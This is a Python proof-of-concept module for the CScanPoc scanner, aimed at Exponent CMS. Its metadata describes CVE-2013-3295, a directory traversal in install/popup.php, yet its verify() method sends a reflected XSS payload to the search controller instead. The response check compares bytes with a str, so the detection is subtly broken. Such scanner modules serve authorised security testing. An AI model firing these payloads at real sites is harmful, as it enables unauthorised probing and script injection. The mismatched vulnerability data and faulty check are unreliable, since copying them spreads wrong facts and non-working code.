# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Exponent-CMS_0001'  # 平台漏洞编号，留空
    name = 'Exponent-CMS install/popup.php中的目录遍历漏洞'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2013-04-26'  # 漏洞公布时间
    desc = '''
        Directory traversal vulnerability in install/popup.php in Exponent CMS before 2.2.0 RC1 allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the page parameter.
    '''  # 漏洞描述
    ref = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3295'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2013-3295'  # cve编号
    product = 'Exponent-CMS'  # 漏洞应用名称
    product_version = 'before 2.2.0 RC1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3a3c14a4-0929-4a01-aec6-886dfbe8badd'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/exponent/index.php?controller=search&src=f324e%22><script>alert(1)</script>9cbae6bf552&action=search&search_string=test&int=%0d'
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)

            content = urllib.request.urlopen(req).read()
            if '<script>alert(1)</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
